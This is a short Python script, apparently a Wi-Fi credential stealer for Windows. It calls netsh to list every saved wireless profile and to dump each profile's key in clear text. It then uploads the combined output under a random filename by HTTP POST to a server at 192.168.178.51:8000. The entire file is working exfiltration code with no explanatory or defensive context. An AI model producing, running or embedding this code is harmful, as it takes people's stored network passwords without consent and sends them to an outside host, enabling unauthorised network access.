import subprocess
import http.client
import random
import string
lan_info_cmd = "netsh wlan show profiles"


result = subprocess.run(lan_info_cmd, capture_output=True, text=True, shell=True)
masssive_result = ""
for ln in result.stdout.split("\n"):
    if ln.find(": ")>=0:
        prep, wf_name = ln.split(":")
        pr_result = subprocess.run(f"netsh wlan show profiles name=\"{wf_name.strip()}\" key=clear",capture_output=True, text=True, shell=True) 
        masssive_result+=pr_result.stdout+"\n"
        
conn = http.client.HTTPConnection("192.168.178.51", 8000)
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
filename = ''.join(random.choice(string.ascii_letters) for _ in range(12))

body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
    f"Content-Type: application/octet-stream\r\n\r\n"
).encode() + masssive_result.encode() + f"\r\n--{boundary}--\r\n".encode()

headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body))
}
conn.request("POST", "/upload", body=body, headers=headers)
response = conn.getresponse()
